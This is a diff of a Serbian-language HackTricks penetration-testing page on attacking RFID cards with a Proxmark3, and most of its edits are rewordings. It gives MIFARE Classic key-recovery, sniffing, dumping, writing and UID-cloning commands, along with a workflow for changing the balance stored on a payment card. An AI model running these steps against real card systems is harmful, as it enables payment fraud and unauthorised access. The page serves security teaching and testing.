@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Napadanje RFID sistema pomoću Proxmark3
+## Napad na RFID sisteme pomoću Proxmark3
 
-Prvo morate imati [**Proxmark3**](https://proxmark.com) i [**instalirati software i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+Instalirajte aktivno održavani RRG/Iceman Proxmark3 client i odgovarajući firmware, a zatim potvrdite sintaksu komandi u toj verziji, jer su starije komande prikazane u nastavku možda promenjene.<sup>[[1]](#references)[[5]](#references)</sup>
 
-### Napadanje MIFARE Classic 1KB
+### Napad na MIFARE Classic 1KB
 
-Ima **16 sektora**, svaki od njih ima **4 bloka**, a svaki blok sadrži **16B**. UID se nalazi u sektoru 0, bloku 0 (i ne može se menjati).\
-Za pristup svakom sektoru potrebna su vam **2 ključa** (**A** i **B**), koji su sačuvani u **bloku 3 svakog sektora** (sector trailer). Sector trailer takođe čuva **access bits** koji pomoću 2 ključa određuju dozvole za **čitanje i pisanje** u **svakom bloku**.\
-2 ključa su korisna za davanje dozvola za čitanje ako znate prvi ključ i pisanje ako znate drugi ključ (na primer).
+MIFARE Classic 1K ima **16 sektora**, a svaki ima **4 bloka** od po **16 bajtova**. Blok proizvođača 0 sadrži UID/podatke proizvođača i na originalnim NXP karticama je read-only; posebne clone ili „magic“ kartice mogu dozvoliti njegovo prepisivanje.<sup>[[1]](#references)[[2]](#references)</sup>\
+Za pristup svakom sektoru potrebna su vam **2 ključa** (**A** i **B**), koji su sačuvani u **bloku 3 svakog sektora** (sector trailer). Sector trailer takođe čuva **access bits** koji određuju **read i write** dozvole za **svaki blok** pomoću 2 ključa.\
+2 ključa su korisna za dodelu read dozvola ako znate prvi ključ, a write dozvola ako znate drugi ključ (na primer).
 
-Može se izvesti nekoliko napada
+Može se izvesti nekoliko napada.
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,9 +31,9 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-Proxmark3 omogućava i druge radnje, kao što je **prisluškivanje** komunikacije između **Tag-a i čitača**, kako bi se pokušalo doći do osetljivih podataka. Na ovoj kartici mogli biste samo da sniff-ujete komunikaciju i izračunate korišćeni ključ, jer su **korišćene kriptografske operacije slabe**, a poznavanjem otvorenog i šifrovanog teksta možete da ga izračunate (alatka `mfkey64`).<sup>[[3]](#references)</sup>
+Proxmark3 omogućava izvođenje drugih radnji, kao što je **eavesdropping** **Tag to Reader komunikacije**, kako bi se pokušali pronaći osetljivi podaci. Na ovoj kartici možete jednostavno sniffovati komunikaciju i izračunati korišćeni ključ jer su **kriptografske operacije koje se koriste slabe**, a poznavanjem plain i cipher teksta možete da ga izračunate (`mfkey64` alat).<sup>[[3]](#references)</sup>
 
-#### MiFare Classic brzi tok rada za zloupotrebu sačuvane vrednosti
+#### Brzi workflow za zloupotrebu sačuvane vrednosti na MiFare Classic karticama
 
 Kada terminali čuvaju stanje na Classic karticama, tipičan end-to-end tok je:<sup>[[4]](#references)</sup>
 ```bash
@@ -49,21 +49,21 @@ proxmark3> hf mf cload -f modified.bin
 # 4) Clone original UID so readers recognize the card
 proxmark3> hf mf csetuid -u <original_uid>
 ```
-Napomene
+Beleške
 
-- `hf mf autopwn` orkestrira napade u stilu nested/darkside/HardNested, oporavlja ključeve i kreira dumpove u klijentskom dumps folderu.<sup>[[1]](#references)</sup>
-- Upisivanje bloka 0/UID-a funkcioniše samo na magic gen1a/gen2 karticama. Standardne Classic kartice imaju UID samo za čitanje.<sup>[[2]](#references)</sup>
-- Mnoge implementacije koriste Classic "value blocks" ili jednostavne kontrolne sume. Uverite se da su sva duplicirana/komplementirana polja i kontrolne sume konzistentne nakon izmene.<sup>[[4]](#references)</sup>
+- `hf mf autopwn` orchestrira nested/darkside/HardNested-style napade, oporavlja ključeve i kreira dump-ove u dumps folderu klijenta.<sup>[[1]](#references)</sup>
+- Upisivanje bloka 0/UID-a funkcioniše samo na magic gen1a/gen2 karticama. Normalne Classic kartice imaju UID samo za čitanje.<sup>[[2]](#references)</sup>
+- Mnoge implementacije koriste Classic „value blocks“ ili jednostavne kontrolne zbirove. Uverite se da su sva duplicirana/komplementirana polja i kontrolni zbirovi konzistentni nakon izmene.<sup>[[4]](#references)</sup>
 
-Pogledajte metodologiju višeg nivoa i mere za ublažavanje rizika na:
+Pogledajte metodologiju višeg nivoa i mere za ublažavanje rizika u:
 
 {{#ref}}
 pentesting-rfid.md
 {{#endref}}
 
-### Raw Commands
+### Sirove komande
 
-IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **raw komandi tagovima**.
+IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **sirovih komandi tagovima**.
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -71,23 +71,23 @@ TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
 proprietary non iso14443-4 card found, RATS not supported
 No chinese magic backdoor command detected
 Prng detection: WEAK
-Valid ISO14443A Tag Found - Quiting Search
+Valid ISO14443A Tag Found - Quitting Search
 ```
-Pomoću ovih informacija možete pokušati da pronađete informacije o kartici i načinu komunikacije sa njom. Proxmark3 omogućava slanje raw komandi kao što je: `hf 14a raw -p -b 7 26`
+Sa ovim informacijama mogli biste pokušati da pronađete informacije o kartici i načinu komunikacije sa njom. Proxmark3 omogućava slanje raw komandi kao što je: `hf 14a raw -p -b 7 26`
 
 ### Skripte
 
-Proxmark3 softver dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili kompletnu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, nakon koje sledi naziv skripte:
+Proxmark3 software dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili kompletnu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, nakon koje sledi ime skripte:
 ```
 proxmark3> script run mfkeys
 ```
-Možete napraviti skriptu za **fuzz čitača tagova**, tako što, nakon kopiranja podataka sa **važeće kartice**, jednostavno napišete **Lua skriptu** koja **nasumično menja** jedan ili više nasumičnih **bajtova** i proverava da li se **čitač ruši** pri nekoj iteraciji.
+Možete napraviti skriptu za **fuzzovanje čitača tagova**, tako što ćete kopirati podatke **važeće kartice**, napisati **Lua skriptu** koja **nasumično menja** jedan ili više **nasumičnih bajtova** i proveriti da li se **čitač ruši** u nekoj iteraciji.
 
-## Reference
+## References
 
 - [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
 - [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
 - [3] [NXP izjava o MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
 - [4] [Eksploatacija ranjivosti NFC kartice u KioSoft Stored Value sistemu (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
-
+- [5] [RRG/Iceman Proxmark3 — Linux instalacija](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
 {{#include ../../banners/hacktricks-training.md}}
